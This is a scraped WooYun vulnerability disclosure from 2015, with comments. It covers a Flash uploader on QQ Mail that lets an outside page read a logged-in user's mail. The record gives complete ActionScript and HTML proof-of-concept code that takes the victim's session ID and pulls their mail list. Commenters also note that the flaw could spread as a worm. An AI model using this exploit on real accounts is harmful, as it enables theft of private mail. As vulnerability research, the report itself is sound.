{"id": 35581, "wybug_id": "wooyun-2015-0107759", "wybug_title": "一封邮件操控QQ邮箱可蠕虫(收发邮件、查看好友列表等）", "wybug_corp": "腾讯", "wybug_author": "EtherDream", "wybug_date": "2015-04-14 09:31", "wybug_open_date": "2015-05-30 11:02", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "逻辑错误", "设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-30：\t细节向公众公开  简要描述： 利用 qq.com 子站下一个 flash，可访问 QQ 邮箱等站点的数据 详细说明：  原理和之前的《读取已登陆用户163/126 邮件的》（www.wooyun.org/bugs/wooyun-2015-0106908）一样。存在漏洞的 flash 文件：http://mail.qq.com/zh_CN/htmledition/swf/uploader1d35b7.swf其中有个 uploader.UploadSchedule 类开放了 URLLoader 操作的接口，使用自己的 flash 将其反射出来，按照其规范调用，即可访问 crossdomain.xml 中授权了 *.qq.com 的站点。并且请求是 POST 的，使得利用更为顺利。例如访问 QQ 邮箱。首先获取 SID，这个貌似有多种登录方式，这里以自己为例，访问：http://mail.qq.com/cgi-bin/login?fun=psaread 可获得已登录的 SID。有了 SID 即可各种操作。访问邮件列表：http://set1.mail.qq.com/cgi-bin/mail_list?sid={SID}&page=0访问 QQ 好友列表：http://set1.mail.qq.com/cgi-bin/laddr_lastlist?sid={SID}&t=addr_datanew&category=hot发邮件：http://set1.mail.qq.com/cgi-bin/compose_send?sid={SID}。。。   漏洞证明：  自己的 flash：\npackage {\timport flash.display.*;\timport flash.events.*;\timport flash.external.*;\timport flash.net.*;\timport flash.system.*;\timport flash.utils.*;\t\t\tpublic class flahack extends Sprite {\t\tprivate static const PATH:String =\t\t\t'uploader.UploadSchedule';\t\tprivate static const URL:String =\t\t\t'http://mail.qq.com/zh_CN/htmledition/swf/uploader1d35b7.swf'\t\tprivate var loader:Loader = new Loader();\t\tprivate var cls:*;\t\t\t\tpublic function flahack() {\t\t\tSecurity.allowDomain('*');\t\t\t//this.addChild(loader);\t\t\tloader.contentLoaderInfo.addEventListener(Event.COMPLETE, onReady);\t\t\t\t\t\tloader.load(new URLRequest(URL));\t\t\tvar tid:uint = setInterval(function() : void {\t\t\t\ttry {\t\t\t\t\tcls = loader.contentLoaderInfo.applicationDomain.getDefinition(PATH);\t\t\t\t\tclearInterval(tid);\t\t\t\t\tonReady(null);\t\t\t\t} catch (e:Error) {\t\t\t\t}\t\t\t}, 100);\t\t}\t\tprivate function onReady(e:Event) : void {\t\t\t\t\t\tExternalInterface.addCallback('Load', extern_load);\t\t\tExternalInterface.call('__fla_ready');\t\t}\t\t\t\tprivate function extern_load(url: String) : void {\t\t\tvar obj:* = new cls();\t\t\tobj.SetLoaderDataFormat('binary');\t\t\tobj.queryUploadSize(url, '');\t\t\tvar tid:uint = setInterval(function() : void {\t\t\t\tvar data:ByteArray = obj.ResponseData;\t\t\t\tif (data) {\t\t\t\t\tclearInterval(tid);\t\t\t\t\tvar str:String = HtmlDecode(data);\t\t\t\t\tExternalInterface.call('__fla_complete',\t\t\t\t\t\turl,\t\t\t\t\t\tstr.replace(/\\\\/g, '\\\\\\\\')\t\t\t\t\t);\t\t\t\t}\t\t\t}, 100);\t\t}\t\t\t\tprivate static function HtmlDecode(buf:ByteArray) : String {\t\t\tbuf.position = 0;\t\t\tvar str:String = buf.readMultiByte(buf.length, 'iso-8859-1');\t\t\t\t\t\tvar charset:String = 'utf-8';\t\t\tvar ret:Array = str.match(/<meta\\s+[^>]*charset=['\"]?\\s*([\\w\\-]*)/i);\t\t\tif (ret && ret[1]) {\t\t\t\tcharset = ret[1];\t\t\t}\t\t\tbuf.position = 0;\t\t\treturn buf.readMultiByte(buf.length, charset);\t\t}\t}}\n其中有几个细节：1.uploader1d35b7.swf 构造函数里用到了 stage 属性，由于被嵌套的 swf 初始化时是没有 stage 的（在 ADD_TO_STAGE 事件之后才有），所以加载这个 flash 时会报错。但万幸的是，在访问 stage 之前，已经执行了 Security.allowDomain('*')，所以即使主类构造失败，但这个 swf 的权限已经打开，不影响后期利用。（调试模式下报错点继续执行即可）2.URLLoader 返回是数据默认是字符型的，遇到中文会乱码。因此这里使用 binary 传输，收到后分析页面中 <meta> 指定的编码，再转码成相应的字集，即可避免乱码。3.UploadSchedule 类没有提供下载完成的回调，因此使用不断轮询的方式，探测是否下载完成。具体的操控逻辑写在网页里。这里以读取邮件列表为例：\n<!doctype html><html><head>\t<meta charset=\"utf-8\" />\t<title>qq mail poc</title>\t<style>\t\t#txt {\t\t\twidth: 800px;\t\t\theight: 400px;\t\t}\t</style></head>\t<embed id=\"fla\" src=\"flahack.swf\" allowScriptAccess=\"always\" style=\"position:absolute; top:-999px;\">\t<textarea id=\"txt\"></textarea>\t<script>\t\tvar URL_SID_1 = 'http://mail.qq.com/cgi-bin/login?fun=psaread';\t\tvar URL_MAIL = 'http://set1.mail.qq.com/cgi-bin/mail_list?sid=%s&page=0';\t\twindow.__fla_ready = function() {\t\t\tconsole.log('ready');\t\t\tfla.Load(URL_SID_1);\t\t};\t\twindow.__fla_complete = function(url, data) {\t\t\tsetTimeout(function() {\t\t\t\tswitch (url) {\t\t\t\tcase URL_SID_1:\t\t\t\t\tprocSID(data);\t\t\t\t\tbreak;\t\t\t\tdefault:\t\t\t\t\tprocMail(data);\t\t\t\t\tbreak;\t\t\t\t}\t\t\t}, 0);\t\t};\t\tfunction procSID(data) {\t\t\tvar m = data.match(/sid=([^\"]+)/);\t\t\tvar sid = m && m[1];\t\t\tif (sid) {\t\t\t\tconsole.info('got sid:', sid);\t\t\t\tconsole.log('loading mail...');\t\t\t\tURL_MAIL = URL_MAIL.replace('%s', sid);\t\t\t\tfla.Load(URL_MAIL);\t\t\t\treturn true;\t\t\t}\t\t\tconsole.warn('fail get sid!');\t\t}\t\tfunction procMail(data) {\t\t\tvar parser = new DOMParser();\t\t\tvar doc = parser.parseFromString(data, 'text/html');\t\t\tvar arr = doc.querySelectorAll('.toarea');\t\t\tfor (var i = 0; i < arr.length; i++) {\t\t\t\tanalyzeGroup(arr[i]);\t\t\t}\t\t\tconsole.dir(mails);\t\t\ttxt.value = JSON.stringify(mails, null, 4);\t\t}\t\tvar mails = [];\t\tfunction analyzeGroup(box) {\t\t\tvar arr = box.querySelectorAll('table.i.M');\t\t\tfor (var i = 0; i < arr.length; i++) {\t\t\t\tanalyzeItem(arr[i]);\t\t\t}\t\t}\t\tfunction analyzeItem(box) {\t\t\tvar sender = box.querySelector('td.tl span');\t\t\tvar title = box.querySelector('div.tf u.tt');\t\t\tvar desc = box.querySelector('div.tf b.no');\t\t\tvar info = {\t\t\t\taddr: sender && sender.getAttribute('e'),\t\t\t\tnick: sender && sender.innerHTML.trim(),\t\t\t\ttitle: title && title.innerText,\t\t\t\tdesc: desc && desc.innerText\t\t\t};\t\t\tmails.push(info);\t\t}\t\tconsole.log('loading flash...');\t</script></body></html>\n不同的登录方式  sid 的位置也不同，但不少页面里都可以获取到。\n\n   修复方案：  敏感信息站点部署 crossdomain.xml 十分危险，设计不合理。   版权声明：转载请注明来源 EtherDream@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-04-15 11:00 厂商回复： 问题已确认，正在处理中，感谢反馈。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-14 09:36 |    \t\tEtherDream \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:11        | JSHacker)\t\t \n  标题怎么又变了~~ 跨站的变成邮件了~    \n     2015-04-14 10:00 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  利用方式发个邮件点击可以确保他是登录的    \n     2015-04-14 10:19 |    \t\tEtherDream \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:11        | JSHacker)\t\t \n  @xsser 哦，是的。还可以搞成蠕虫的：）    \n     2015-04-14 10:24 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @EtherDream ：）    \n     2015-04-15 11:07 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  今天各种邮箱漏洞    \n     2015-04-15 11:11 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  感觉好嗨    \n     2015-04-15 14:24 |    \t\t辛巴 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:83        | 现实中的无能为力，不代表网络中也要低声下...)\t\t \n  抢个楼，感觉好厉害  猴赛雷    \n     2015-04-15 14:33 |    \t\tEtherDream \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:11        | JSHacker)\t\t \n  其实和 qq 关系不大，是个 flash 自身缺陷，好多网站都有中招，就不重复刷了。    \n     2015-04-15 16:06 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @EtherDream 其实这个你可以提交成通用型漏洞，还有通用奖励的    \n     2015-04-15 16:36 |    \t\tFire ant \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:26        | 他们回来了................)\t\t \n  侯赛里    \n     2015-04-15 19:55 |    \t\tMayIKissYou \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:33        | 勿忘初心)\t\t \n  吊吊吊    \n     2015-04-15 20:21 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  也许来看下更健康    \n     2015-04-15 20:59 |    \t\t咖啡 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:20        )\t\t \n  掉渣天    \n     2015-04-15 23:44 |    \t\t财神8868 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 财神送礼,万分康荣！)\t\t \n  叼炸天    \n     2015-04-15 23:46 |    \t\t刘海哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:28        | 索要联系方式但不送礼物的厂商定义为无良厂...)\t\t \n  @EtherDream qq邮箱听说还有越权咯    \n     2015-04-20 13:02 |    \t\tEtherDream \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:11        | JSHacker)\t\t \n  @px1624 写了篇该缺陷原理分析的文章：http://drops.wooyun.org/papers/5732    \n     2015-09-15 20:25 |    \t\tNaih \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 无趣之人)\t\t \n  @EtherDream   这些API的referer限制，你怎么绕过去的     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}